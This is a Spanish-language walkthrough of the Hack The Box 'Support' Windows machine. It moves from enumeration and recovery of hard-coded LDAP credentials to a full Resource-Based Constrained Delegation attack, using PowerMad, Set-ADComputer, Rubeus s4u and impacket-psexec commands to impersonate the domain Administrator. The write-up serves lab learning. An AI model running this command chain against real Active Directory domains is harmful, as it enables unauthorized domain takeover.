OS: Windows 
Level: Easy 

# Enumeración

Hacemos un ping y confirmamos que es una maquina Windows:

![[Pasted image 20260426164527.png]]

Miramos los puertos abiertos:

![[Pasted image 20260426164627.png]]

Hacemos un escaneo de cada puerto individualmente de versiones y servicios que están corriendo:

```shell
sudo nmap 10.129.39.222 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49690,49703,61309 -sCV -T5 -v 
```

```python
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-26 03:33 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
Initiating Ping Scan at 03:33
Scanning 10.129.39.222 [4 ports]
Completed Ping Scan at 03:33, 0.23s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 03:33
Scanning support.htb (10.129.39.222) [19 ports]
Discovered open port 135/tcp on 10.129.39.222
Discovered open port 53/tcp on 10.129.39.222
Discovered open port 445/tcp on 10.129.39.222
Discovered open port 88/tcp on 10.129.39.222
Discovered open port 49678/tcp on 10.129.39.222
Discovered open port 593/tcp on 10.129.39.222
Discovered open port 139/tcp on 10.129.39.222
Discovered open port 9389/tcp on 10.129.39.222
Discovered open port 3269/tcp on 10.129.39.222
Discovered open port 49664/tcp on 10.129.39.222
Discovered open port 49667/tcp on 10.129.39.222
Discovered open port 3268/tcp on 10.129.39.222
Discovered open port 636/tcp on 10.129.39.222
Discovered open port 389/tcp on 10.129.39.222
Discovered open port 5985/tcp on 10.129.39.222
Discovered open port 49703/tcp on 10.129.39.222
Discovered open port 464/tcp on 10.129.39.222
Discovered open port 49690/tcp on 10.129.39.222
Discovered open port 61309/tcp on 10.129.39.222
Completed SYN Stealth Scan at 03:33, 0.49s elapsed (19 total ports)
Initiating Service scan at 03:33
Scanning 19 services on support.htb (10.129.39.222)
Completed Service scan at 03:34, 56.99s elapsed (19 services on 1 host)
NSE: Script scanning 10.129.39.222.
Initiating NSE at 03:34
Completed NSE at 03:35, 40.85s elapsed
Initiating NSE at 03:35
Completed NSE at 03:35, 9.83s elapsed
Initiating NSE at 03:35
Completed NSE at 03:35, 0.01s elapsed
Nmap scan report for support.htb (10.129.39.222)
Host is up (0.22s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-26 19:16:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
61309/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 11h42m57s
| smb2-time: 
|   date: 2026-04-26T19:17:22
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
Initiating NSE at 03:35
Completed NSE at 03:35, 0.00s elapsed
Initiating NSE at 03:35
Completed NSE at 03:35, 0.00s elapsed
Initiating NSE at 03:35
Completed NSE at 03:35, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.59 seconds
           Raw packets sent: 23 (988B) | Rcvd: 20 (864B)
```

Enumeramos con netexec por un posible SMB Null auth en el dominio, y confirmamos que el dominio es support.htb:

![[Pasted image 20260427084608.png]]

Vemos que efectivamente tenemos un null session sobre los recursos smb, ahora vamos a ver a que tenemos permiso como Guest:

![[Pasted image 20260427085220.png]]

Vemos que hay un recurso especial llamado support-tools, para el cual tenemos permisos de lectura, veamos que contiene:

![[Pasted image 20260427085908.png]]

Todos ejecutables se encuentran publicamente, excepto por UserInfo, por lo que nos lo podemos descargar y ver que hace:

![[Pasted image 20260427090855.png]]

Ahora podemos ejecutarlo en una maquina virtual de Windows:

![[Screenshot 2026-05-07 091915.png]]

Vemos que tenemos una opción para buscar usuarios y otro para obtener información de un usuario especifico, intentemos probar diferentes opciones a ver que encontramos:

![[Screenshot 2026-05-07 092128.png]]

Nos está pidiendo el parametro `-username`, pero al indicarlo nos sale el siguiente error:

![[Screenshot 2026-05-07 092146.png]]

Esto me hace pensar que se están intentando hacer peticiones al servidor (seguramente del DC) enviando LDAP queries,  por lo que probablemente tengmaos que añadiro support.htb (el nombre de dominio), el archivo `C:\Windows\System32\drivers\etc\hosts`, despues de hacer esto vemos que efectivamente obtenemos la información:

![[Screenshot 2026-05-07 095849.png]]

Esto es una buena señal ya que significa que seguramente las credenciales de LDAP deben estar en el codigo de UserInfo.exe, por lo que lo podemos abrir con DNSpy y despues de rebuscar en donde se enviaba la Query, encontramos este codigo: 

![[cap.png]]

![[Screenshot 2026-05-08 102535.png]]

Basicamente lo que hace este codigo, es, almacenar en enc_password, la contraseña encriptada con la palabra key armando, y en la parte de arriba, es la desencripación que se hace de esa password para enviarla en la Query de ldap, entonces simplemente copie y pegue el codigo en una pagina para ejecutarlo, pero modificando algunas cosas apra que me muestre el resultado de esa desencriptacion:


![[Screenshot 2026-05-07 104216.png]]

Esto me da como resultado la contraseña: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

Con estas credenciales lo primero que puedo probar es una recolección de info con bloohound-python:

![[Pasted image 20260508153715.png]]

Analizando no vemos nada interesante para el usuario ldap en bloodhound:

![[Pasted image 20260508154645.png]]

Vemos que no hay Outbound controls saliendo de LDAP@support.htb.

Por lo que tenemos que buscar alternativas para obtener acceso usando estas credenciales, vamos a dumpear toda la base de datos de LDAP para ver informacion importante, los atributos mas interesantes que puede tener cada usuario son info, comment y description, por lo que filtraremos teniendo en cuenta esto:

```bash
sudo ldapsearch -H ldap://10.129.51.75 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -E "info|description|comment"
```

![[Pasted image 20260509092857.png]]

Todo normal, excepto por el campo Info, que parece ser una contraseña, entonces vamos a ver a quien le corresponde ese campo:

```shell
sudo ldapsearch -H ldap://10.129.51.75 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep "info" -C 10 
```


![[Pasted image 20260509093641.png]]

Vemos que le pertenece a support, vamos a confirmarlo con netexec:

![[Pasted image 20260509093952.png]]

Ahora vamos a analizar que privilegios tenemos como support, y encontramos unas cuentas cosas interesantes, lo primero es que hacemos parte de Managment Users, y ademas, al ser parte de SHARED SUPPORT ACCOUNTS, podemos tener permisos GenericAll:

![[Pasted image 20260509095130.png]]


Vamos a entrar por evil-winrm a la maquina para explotar un RBCD (Resource-Based Constrained Delegation):

![[Pasted image 20260510182936.png]]

Ahora vamos a subir unas cuantas herramientas que serán necesarias para nuestra escalada de privilegios:

- PowerView.ps1: Enumerar información del dominio
- Powermad.ps1: Explotar vulnerabilidades de MachineAccountQuota
- Rubeus.exe: para explotar Kerberos y Creación de tickets

![[Pasted image 20260510195859.png]]

Ahora vamos a instalar los modulos PowerView y Powermad:

![[Pasted image 20260510200815.png]]

Usaremos PowerView para saber la cantidad de maquinas que se pueden crear msDS-AccountMachineQuota 


### Revisar MachineAccountQuota (Dentro del DC)

```ruby
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DSMachineAccountQuota
```


![[Pasted image 20260510143020.png]]

Hay un cupo de 10 maquinas, por lo que ahora podemos pasar al sigueinte paso
### Revisar el parametro msDS-AllowedAoActABehalfOfOtherIdentity 

Tenemos que ver si esta vacio este atributo, porque dependiendo de eso cambia la forma del ataque:

**Si está vacío:** Puedes escribir directamente sin problema. Es el escenario ideal para el ataque.

**Si ya tiene un valor:** Puedes sobreescribirlo si tienes permisos de escritura sobre el objeto. El atributo acepta ser modificado si tienes los permisos necesarios.


Para esto vamos a usar [[PowerView]] un Modulo de Powershell usado para enumerar información del dominio:

```ruby
. ./PowerView.ps1
```

Ahora con  `Get-DomainComputer DC` 

```ruby
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

## Crear cuenta de maquina

Crearemos la cuenta de maquina usando [[PowerMad]]:

```ruby
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

Vamos a comprobar que si se haya creado la cuenta de maquina (Machine Account):

```ruby
Get-ADComputer -identity FAKE-COMP01
```

## Setear parametro msDS-AllowedAoActABehalfOfOtherIdentity

Vamos a setear esta cuenta de maquina en el parametro **`msDS-AllowedAoActABehalfOfOtherIdentity`** para que confie en esa maquina falsa, para eso usamos el parametro **``PrincipalsAllowedToDelegateToAccount``** que basicamente traduce la cuenta de maquina en el Security Descriptor, que es lo que finalmente se guarda en **`msDS-AllowedAoActABehalfOfOtherIdentity`**: 

```python
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

## Comprobar el parametro msDS-AllowedToActABehalfOfOtherIdentity

Ahora comprobemos que efectivamente el parametro **`msDS-AllowedAoActABehalfOfOtherIdentity`** tenga este valor:

```r
 
```

Vemos que aparece con el nombre de **``PrincipalsAllowedToDelegateToAccount``**, no es que sea un parametro diferente, es que es la traduccion del security descriptor que hay en **`msDS-AllowedToActABehalfOfOtherIdentity`**:


![[Pasted image 20260510172521.png]]


## Explotación de S4U2Self y S4U2Proxy

Ya que la maquina de cuenta FAKE-COMP01 tiene permiso para hacerse pasar por otros usuarios frente a dc.support.htb, podemos pedir un TGS de Administrator para acceder a el SPN *`cifs/dc.support.htb`*, esto lo podemos hacer desde windows con Rubeus.exe:

Primero tenemos que obtener el hash rc4 de la cuenta de servicio o cuenta de maquina sobre la que tengamos control:

```r
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

![[Pasted image 20260512082953.png]]

Ya con el hash (resaltado en verde) podemos solicitar el TGS del usuario Administrator para el SPN  **`cifs/dc.support.htb`**:

```r
rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```


![[Pasted image 20260512082548.png]]

Ahora tenemos que **`convertir el ticket`**, porque está en .kirbi, pero como la idea es usarlo en linux con psexec o wmiexec es fundamental que el formato sea .ccache:

Rubeus nos entregó el ticket en base64, vamos a quitarle los saltos de linea y espacios en blanco para poder desencodearlo dentro de un archivo, para quitar estos espacios en blanco podemos usar [esta](https://www.browserling.com/tools/remove-all-whitespace)pagina.

Con todo metido en el archivo vamos a desencodearlo y mterlo en un archivo:

```r
base64 -d kerb.b64 > kerb.kirbi
```

Ahora lo convertimos de .kirbi a .ccache:

```r
impacket-ticketConverter kerb.kirbi kerb.ccache
```

Vamos a exportar la ruta del ticket en la variable de entorno KRB5CCNAME para que pueda ser usado por las diferentes herramientas de impacket:

```r
export KRB5CCNAME=$(pwd)/kerb.ccache
```

Listo!, ya tenemos el ticket de administrator, vamos a conectarnos al dc usando psexec (psexec usa SMB para conectarse, por eso es que nos sirve para el SPN cifs):

```r
impacket-psexec 'support.htb/Administrator@dc.support.htb' -no-pass -k
```

Al ejecutar el comando nos sale el error:


***`Error: \[-\] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.`***

Esto lo solucioné sincronizando la hora de mi maquina con la del DC:

```r
sudo timedatectl set-ntp off
```


